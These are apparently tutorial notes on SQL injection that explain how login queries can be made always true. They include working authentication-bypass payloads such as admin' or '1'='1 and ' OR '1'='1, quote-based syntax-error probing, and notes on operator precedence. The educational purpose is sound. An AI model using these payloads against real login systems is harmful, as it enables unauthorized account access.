# Subverting Query Logic

Now that we understand the basics of SQL queries and SQL Injection, the next important concept is:

```text
Subverting Query Logic
```

This means:
```text
Manipulating the original SQL query so it behaves differently than intended
```

Instead of executing entirely new SQL queries, attackers often:
- Modify conditions
- Abuse logical operators
- Force queries to always return TRUE
- Bypass authentication systems

One of the most common examples is:
```text
Authentication Bypass
```

:contentReference[oaicite:0]{index=0}

---

# Authentication Bypass

Consider a simple admin login page.

The application takes:
- Username
- Password

and sends them into an SQL query.

Correct credentials:

```text
Username: admin
Password: p@ssw0rd
```

Executed SQL query:

```sql
SELECT * FROM logins WHERE username='admin' AND password='p@ssw0rd';
```

:contentReference[oaicite:1]{index=1}

---

# Understanding the Login Logic

The application uses the `AND` operator.

Meaning:
```text
Username must be correct
AND
Password must also be correct
```

If both conditions are TRUE:
- Database returns matching records
- Login succeeds

Otherwise:
- Login fails

---

# Example of Failed Login

Wrong password example:

```sql
SELECT * FROM logins WHERE username='admin' AND password='admin';
```

Since the password is incorrect:
```text
Condition becomes FALSE
```

and login fails. :contentReference[oaicite:2]{index=2}

# Testing with Single Quote (`'`)

Injected username:

```text
'
```

Resulting query:

```sql
SELECT * FROM logins WHERE username=''' AND password = 'something';
```

:contentReference[oaicite:4]{index=4}

This creates:
```text
An odd number of quotes
```

which breaks SQL syntax.

Result:
```text
SQL syntax error
```

This is often the first indicator of SQL Injection vulnerability.

---

# Why Syntax Errors Happen

Original query:

```sql
username='$input'
```

Injected input:

```text
'
```

Final query:

```sql
username=''''
```

The database gets confused because:
- Quotes are unbalanced
- String boundaries are broken

# OR Injection

The goal of authentication bypass is:
```text
Force the query to always evaluate to TRUE
```

This is commonly done using:
```sql
OR
```

operator injection.

:contentReference[oaicite:5]{index=5}

---

# Why OR Works

In SQL:

```text
TRUE OR anything = TRUE
```

So if attackers inject:
```sql
OR '1'='1'
```

the condition always becomes TRUE because:

```sql
'1'='1'
```

always evaluates to TRUE.

---

# Authentication Bypass Payload

Injected username:

```sql
admin' or '1'='1
```

:contentReference[oaicite:6]{index=6}

Final SQL query:

```sql
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
```

:contentReference[oaicite:7]{index=7}

---

# Breaking Down the Logic

The query becomes:

```text
If username is admin
OR
If 1=1 is TRUE
AND
If password is something
```

:contentReference[oaicite:8]{index=8}

---

# Operator Precedence

SQL evaluates:
```text
AND before OR
```

So this part executes first:

```sql
'1'='1' AND password='something'
```

Evaluation:

```text
'1'='1' → TRUE
password='something' → FALSE
TRUE AND FALSE → FALSE
```

Then SQL evaluates:

```sql
username='admin' OR FALSE
```

If admin exists:
```text
Final result becomes TRUE
```

and login succeeds.

:contentReference[oaicite:9]{index=9}

---

# Successful Login with OR Injection

Injected payload:

```sql
admin' OR '1'='1
```

Response:

```text
Login successful as user: admin
```

:contentReference[oaicite:10]{index=10}

The attacker successfully bypasses authentication without knowing the real password.

# What if Username is Invalid?

Payload:

```sql
notAdmin' OR '1'='1
```

Final query:

```sql
SELECT * FROM logins WHERE username='notAdmin' OR '1'='1' AND password='something';
```

:contentReference[oaicite:11]{index=11}

Result:
```text
Login failed
```

Why?

Because:
```text
Username does not exist
```

and the logic still evaluates to FALSE overall.

---

# Injecting into Password Field

To make the entire query TRUE regardless of username:

Inject into password field:

```sql
something' OR '1'='1
```

:contentReference[oaicite:12]{index=12}

Final query:

```sql
SELECT * FROM logins WHERE username='notAdmin' OR '1'='1' AND password='something' OR '1'='1';
```

:contentReference[oaicite:13]{index=13}

Now:
```text
At least one TRUE condition exists
```

So:
```text
Entire query becomes TRUE
```

and authentication is bypassed.

---

# Logging in Without Valid Username or Password

Payload:

```sql
' OR '1'='1
```

Injected directly into fields.

Final query:

```sql
SELECT * FROM logins WHERE username='' OR '1'='1' AND password='something' OR '1'='1';
```

:contentReference[oaicite:14]{index=14}

Because:
```text
'1'='1'
```

is always TRUE,
the application logs in successfully.

# Why Authentication Bypass Works

Authentication systems usually:
- Depend on SQL query results
- Trust returned database records

If attackers manipulate the query to:
```text
Always return records
```

the application assumes:
```text
Authentication succeeded
```
